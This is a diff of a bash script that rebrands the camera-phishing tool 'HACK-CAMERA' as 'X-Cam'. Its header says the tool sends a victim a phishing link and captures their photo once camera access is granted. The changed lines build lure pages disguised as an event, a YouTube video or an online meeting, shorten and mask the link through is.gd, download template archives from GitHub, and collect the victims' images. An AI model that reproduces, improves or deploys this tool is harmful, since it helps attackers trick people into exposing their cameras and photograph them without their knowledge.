@@ -1,12 +1,12 @@
 #!/bin/bash
 
-# HACK-CAMERA 
-# Version    : 2.1
-# Description: CameraHackHack is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
-# Author     : X PHANTOM PH4N70M
-# Github     : https://github.com/hackerxphantom
-# Join Us    : https://bit.ly/3PV3S3r
-# Date       : 29-05-2022
+# X-Cam
+# Version    : 3.0
+# Description: X-Cam is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
+# Author     : MD Asif Hasan
+# Github     : https://github.com/detasploit
+# Twitter    : https://twitter.com/detasploit
+# Date       : 05-03-2024
 # Language   : Shell, HTML, Css
 # Portable File
 # If you copy, consider giving credit! We keep our code open source to help others
@@ -36,12 +36,14 @@ cwd=`pwd`
 
 # Logo 
 logo="    
-${blue}  _   _    _    ____ _  __      ____    _    __  __ _____ ____      _    
-${blue} | | | |  / \  / ___| |/ /     / ___|  / \  |  \/  | ____|  _ \    / \   
-${blue} | |_| | / _ \| |   | ' /_____| |     / _ \ | |\/| |  _| | |_) |  / _ \  
-${blue} |  _  |/ ___ \ |___| . \_____| |___ / ___ \| |  | | |___|  _ <  / ___ \ 
-${blue} |_| |_/_/   \_\____|_|\_\     \____/_/   \_\_|  |_|_____|_| \_\/_/   \_\
-${green}                                               [By X PHANTOM (PH4N7OM)]
+${blue} 
+__  __      ____
+\ \/ /     / ___|__ _ _ __ ___
+ \  /_____| |   / _` | '_ ` _ \
+ /  \_____| |__| (_| | | | | | |
+/_/\_\     \____\__,_|_| |_| |_|              
+
+[By MD Asif Hasan (DetaSploit)] 
 "
 
 # Package Installer
@@ -101,14 +103,14 @@ replacer() {
         break
     elif echo $option | grep -q "2"; then
         sed "s+forwarding_link+"$1"+g" template.php > index.php
-        sed "s+forwarding_link+"$1"+g" festivalwishes.html > index3.html
-        sed "s+fes_name+"$fest_name"+g" index3.html > index2.html
+        sed "s+forwarding_link+"$1"+g" event.html > index3.html
+        sed "s+event+"$fest_name"+g" index3.html > index2.html
         rm -rf index3.html
         break
     elif echo $option | grep -q "3"; then
         sed "s+forwarding_link+"$1"+g" template.php > index.php
-        sed "s+forwarding_link+"$1"+g" LiveYTTV.html > index3.html
-        sed "s+live_yt_tv+"$vid_id"+g" index3.html > index2.html
+        sed "s+forwarding_link+"$1"+g" youtube.html > index3.html
+        sed "s+youtube+"$vid_id"+g" index3.html > index2.html
         rm -rf index3.html
         break
     elif echo $option | grep -q "4"; then
@@ -119,12 +121,12 @@ replacer() {
     done
     echo -e "${info}Your urls are: ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \n"
     sleep 1
-    echo -e "${success}Link 1 : ${1}\n"
+    echo -e "${success}URL 1 : ${1}\n"
     sleep 1
     netcheck
     masked=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${1})
     if ! [[ -z $masked ]]; then
-        echo -e "${success}URL 2 > ${masked}\n"
+        echo -e "${success}URL 2 : ${masked}\n"
     fi
 }
 
@@ -132,11 +134,11 @@ replacer() {
 stty -echoctl
 
 # Detect UserInterrupt
-trap "echo -e '\n${success}Thanks for Using! Visit Site : https://bit.ly/3LAy80f\n'; exit" 2
+trap "echo -e '\n${success}Thanks for using our tool.\n'; exit" 2
 
 # Termux
 if [[ -d /data/data/com.termux/files/home ]]; then
-termux-fix-shebang hack_camera.sh
+termux-fix-shebang xcam.sh
 termux=true
 else
 termux=false
@@ -144,18 +146,18 @@ fi
 
 # Workdir
 if $termux; then
-if ! [ -d /sdcard/Pictures ]; then
-cd /sdcard && mkdir Pictures
+if ! [ -d /sdcard/DetaSploit ]; then
+cd /sdcard && mkdir DetaSploit
 fi
-export FOL="/sdcard/Pictures"
+export FOL="/sdcard/DetaSploit"
 cd "$FOL"
 if ! [[ -e ".temp" ]]; then 
-touch .temp  || (termux-setup-storage && echo -e "\n${error}Please Restart Termux!\n\007" && sleep 5 && exit 0)
+touch .temp  || (termux-setup-storage && echo -e "\n${error}Please restart terminal!\n\007" && sleep 5 && exit 0)
 fi
 cd "$cwd"
 else
-if [ -d "$HOME/Pictures" ]; then
-export FOL="$HOME/Pictures"
+if [ -d "$HOME/DetaSploit" ]; then
+export FOL="$HOME/DetaSploit"
 else
 export FOL="$cwd"
 fi
@@ -184,7 +186,7 @@ elif [ `command -v apk` ]; then
 elif [ `command -v pacman` ]; then
     pacman=true
 else
-    echo -e "${error}No supported package manager found! Install packages manually!\007\n"
+    echo -e "${error}No supported package manager found. Install packages manually.\007\n"
     exit 1
 fi
 else
@@ -195,7 +197,7 @@ elif [ `command -v apt-get` ]; then
 elif [ `command -v brew` ]; then
     pac_man="brew"
 else
-    echo -e "${error}No supported package manager found! Install packages manually!\007\n"
+    echo -e "${error}No supported package manager found. Install packages manually.\007\n"
     exit 1
 fi
 fi
@@ -354,11 +356,10 @@ while true; do
 clear
 echo -e "$logo"
 sleep 1
-echo -e "${ask}Choose an option:
-${red}[${white}1${red}] ${cyan}Jio Recharge
-${red}[${white}2${red}] ${cyan}Festival
-${red}[${white}3${red}] ${cyan}Live Youtube
-${red}[${white}4${red}] ${cyan}Online Meeting
+echo -e "${ask}Options:
+${red}[${white}1${red}] ${cyan}Event
+${red}[${white}2${red}] ${cyan}YouTube
+${red}[${white}3${red}] ${cyan}Online Meeting
 ${red}[${white}d${red}] ${cyan}Change Image Directory (current: ${red}${FOL}${yellow})
 ${red}[${white}p${red}] ${cyan}Change Default Port (current: ${red}${PORT}${yellow})
 ${red}[${white}t${red}] ${cyan}Change Default Tunneler (current: ${red}${TN}${yellow})
@@ -368,15 +369,15 @@ ${red}[${white}0${red}] ${cyan}Exit${blue}
 "
 
 sleep 1
-printf "${cyan}\nXPHANTOM${nc}@${blue}PH4N70M ${red}$ ${nc}"
+printf "${cyan}\nX-Cam${nc}@${blue}DetaSploit ${red}$ ${nc}"
 read option
 # Select template
-    if echo $option | grep -q "1"; then
+    if echo $option | grep -q "999"; then
         dir="jio"
         break
-    elif echo $option | grep -q "2"; then
-        dir="fest"
-        printf "\n${ask}Enter festival name:${cyan}\n\nXPHANTOM${nc}@${blue}XPH4N70M ${red}$ ${nc}"
+    elif echo $option | grep -q "1"; then
+        dir="event"
+        printf "\n${ask}Enter event name:${cyan}\n\nX-Cam${nc}@${blue}DetaSploit ${red}$ ${nc}"
         read fest_name
         if [ -z $fest_name ]; then
             echo -e "\n${error}Invalid input!\n\007"
@@ -385,9 +386,9 @@ read option
             fest_name="${fest_name//[[:space:]]/}"
             break
         fi
-    elif echo $option | grep -q "3"; then
-        dir="live"
-        printf "\n${ask}Enter youtube video ID:${cyan}\n\nXPhantom${nc}@${blue}XPH4N70M ${red}$ ${nc}"
+    elif echo $option | grep -q "2"; then
+        dir="youtube"
+        printf "\n${ask}Enter youtube video ID:${cyan}\n\nX-Cam${nc}@${blue}DetaSploit ${red}$ ${nc}"
         read vid_id
         if [ -z $vid_id ]; then
             echo -e "\n${error}Invalid input!\n\007"
@@ -395,8 +396,8 @@ read option
         else
             break
         fi
-    elif echo $option | grep -q "4"; then
-        dir="om"
+    elif echo $option | grep -q "3"; then
+        dir="onlinemeeting"
         break
     elif echo $option | grep -q "t"; then
         if [ $TN == "Cloudflared" ]; then
@@ -405,7 +406,7 @@ read option
             export TN="Cloudflared"
         fi
     elif echo $option | grep -q "i"; then
-        printf "\n${ask}Enter Directory:${cyan}\n\nXPHANTOM${nc}@${blue}XPH4N70M ${red}$ ${nc}"
+        printf "\n${ask}Enter Directory:${cyan}\n\nX-Cam${nc}@${blue}DetaSploit ${red}$ ${nc}"
         read dire
         if ! [ -d $dire ]; then
             echo -e "\n${error}Invalid directory!\n\007"
@@ -418,17 +419,17 @@ read option
     elif echo $option | grep -q "x"; then
         clear
         echo -e "$logo"
-        echo -e "$red[ToolName]  ${cyan}  :[HACK-CAMERA]
-$red[Version]    ${cyan} :[2.1]
-$red[Description]${cyan} :[Camera Phishing tool]
-$red[Author]     ${cyan} :[XPHANTOM PH4N70M]
-$red[Github]     ${cyan} :[https://github.com/hackerxphantom] 
-$red[Join us]    ${cyan} :[https://bit.ly/3PV3S3r]
-$red[Telegarm]   ${cyan} :[https://t.me/x_PH4N7OM]"
-printf "${cyan}\nXPHANTOM${nc}@${cyan}XPH4N70M ${red}$ ${nc}"
+        echo -e "$red[Tool Name]  ${cyan}  :[X-Cam]
+$red[Version]    ${cyan} :[3.0]
+$red[Description]${cyan} :[Hack any camera using X-Cam]
+$red[Author]     ${cyan} :[MD Asif Hasan]
+$red[Github]     ${cyan} :[https://github.com/DetaSploit] 
+$red[Twitter]    ${cyan} :[https://twitter.com/detasploit]
+$red[Telegarm]   ${cyan} :[https://t.me/detasploit_network]"
+printf "${cyan}\nX-Cam${nc}@${cyan}DetaSploit ${red}$ ${nc}"
 read about
     elif echo $option | grep -q "m"; then
-        xdg-open "https://bit.ly/3PV3S3r"
+        xdg-open "https://twitter.com/detasploit"
     elif echo $option | grep -q "0"; then
         exit 0
     else
@@ -445,7 +446,7 @@ if ! [ -d $dir ];then
 mkdir $dir
 cd $dir
 netcheck
-wget -q --show-progress "https://github.com/XPH4N70M/files/raw/main/${dir}.zip"
+wget -q --show-progress "https://github.com/DetaSploit/files/raw/main/${dir}.zip"
 unzip ${dir}.zip > /dev/null 2>&1
 rm -rf ${dir}.zip
 else
@@ -534,7 +535,7 @@ while true; do
     fi
     sleep 0.5
     if [[ -e "log.txt" ]]; then
-        echo -e "\007${success}IMAGE FILE RECEIVED ! Download...\n"
+        echo -e "\007${success}IMAGE FILE RECEIVED!\n"
         file=`ls | grep png`
         mv -f $file $FOL
         rm -rf log.txt
